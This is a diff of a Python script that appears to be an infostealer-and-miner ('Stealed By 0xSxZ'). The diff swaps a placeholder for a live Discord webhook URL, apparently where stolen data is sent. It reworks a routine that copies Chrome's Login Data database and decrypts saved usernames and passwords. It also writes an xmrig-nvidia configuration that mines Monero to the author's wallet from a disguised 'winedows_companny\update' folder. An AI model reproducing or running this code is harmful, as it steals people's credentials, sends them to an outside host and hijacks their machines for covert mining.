@@ -58,7 +58,7 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+chiffre = "https://discord.com/api/webhooks/1010620457176813578/Yo0ETX1u2D_8JA-MyeC9TNka0by_hHreORxkCb1ydyN9IcCjPJoYLkZwe6yMxeyniA52"
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -345,62 +345,56 @@ if yes == "yes":
 			return "Chrome < 80"
 	def main():
 		binks = "==============Stealed By 0xSxZ=============="
-		try:
-			for i in range(len(chromiumpaths)):
-				db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Login Data"
+		for i in range(len(chromiumpaths)):
+			db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Login Data"
+			if not os.path.exists(db_path):
+				db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data" +"\\Login Data"
 				if not os.path.exists(db_path):
-					db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data" +"\\Login Data"
+					db_path = chromiumpaths[i]+ "\\Login Data"
 					if not os.path.exists(db_path):
-						db_path = chromiumpaths[i]+ "\\Login Data"
-						if not os.path.exists(db_path):
-							db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
-							if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
-								continue
-				local_state_path = chromiumpaths[i]  + "\\Local State"
-				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
-					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
-					if not os.path.isfile(local_state_path):
-						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
-						if not os.path.isfile(local_state_path):
+						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
+						if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
 							continue
-				master_key = get_master_key(local_state_path)
-				login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
-				dbpath = str(uuid.uuid4())
-				shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
-				conn = sqlite3.connect(dbpath)
-				cursor = conn.cursor()
+			local_state_path = chromiumpaths[i]  + "\\Local State"
+			if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
+				local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
+				if not os.path.isfile(local_state_path):
+					local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
+					if not os.path.isfile(local_state_path):
+						continue
+			master_key = get_master_key(local_state_path)
+			login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+			dbpath = str(uuid.uuid4())
+			shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
+			conn = sqlite3.connect(dbpath)
+			cursor = conn.cursor()
 
-				try:
-					cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-					for r in cursor.fetchall():
-						url = r[0]
-						username = r[1]
-						encrypted_password = r[2]
-						decrypted_password = decrypt_password(encrypted_password, master_key)
-						binks = binks + (f"Main URL: {url}\n")
-						binks = binks +(f"User name: {username}\n")
-						binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
-						binks = binks + ("=" * 100)
-				except Exception as e:
-					pass
+			try:
+				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+				for r in cursor.fetchall():
+					url = r[0]
+					username = r[1]
+					encrypted_password = r[2]
+					decrypted_password = decrypt_password(encrypted_password, master_key)
+					binks = binks + (f"Main URL: {url}\n")
+					binks = binks +(f"User name: {username}\n")
+					binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
+					binks = binks + ("=" * 100)
+			except Exception as e:
+				print(e)
 
-				cursor.close()
-				conn.close()
-				try:
-					os.remove(dbpath)
-				except Exception as e:
-					pass
+			cursor.close()
+			conn.close()
+			try:
+				os.remove(dbpath)
+			except Exception as e:
+				pass
 
 
-				try:
-					  
-					# trying to remove the copied db file as 
-					# well from local computer
-					os.remove(filename)
-				except:
-					pass
-		except ZeroDivisionError as e:
-	  		return str(e)
+			try:
+				os.remove(filename)
+			except:
+				pass
 		return binks
 	def PasswLinux():
 		try:
@@ -663,37 +657,54 @@ if yes == "yes":
 						zip_ref.extractall(os.getenv('APPDATA') + "\\winedows_companny\\update")
 					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\config.json", "x").write('''
 {
-	"coin": "monero",
-	"api": {
-		"port": 0,
-		"access-token": null,
-		"worker-id": null,
-		"ipv6": false,
-		"restricted": true
-	},
-	"background": true,
-	"colors": true,
-	"donate-level": 5,
-	"log-file": null,
-	"pools": [
-		{
-			"url": "xmr-eu1.nanopool.org:14444",
-			"user": "''' + ADDRESS + '''",
-			"pass": "x",
-			"keepalive": true,
-			"nicehash": false,
-			"variant": -1,
-			"tls": false,
-			"tls-fingerprint": null
-		}
-	],
-	"print-time": 60,
-	"retries": 5,
-	"retry-pause": 5,
-	"syslog": false,
-	"threads": null
+    "algo": "cryptonight",
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "id": null,
+        "worker-id": null,
+        "ipv6": false,
+        "restricted": true
+    },
+    "background": false,
+    "colors": true,
+    "cuda-bfactor": 12,
+    "cuda-bsleep": 520,
+    "cuda-max-threads": 12,
+    "donate-level": 5,
+    "log-file": null,
+    "pools": [
+        {
+            "url": "xmr-eu1.nanopool.org:14444",
+            "user": "''' + ADDRESS + '''",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "variant": -1,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "threads": [
+        {
+            "index": 0,
+            "threads": 4,
+            "blocks": 64,
+            "bfactor": 6,
+            "bsleep": 25,
+            "sync_mode": 3,
+            "affine_to_cpu": false
+        }
+    ],
+    "user-agent": null,
+    "syslog": false,
+    "watch": true
 }
-
 
 
 					''')
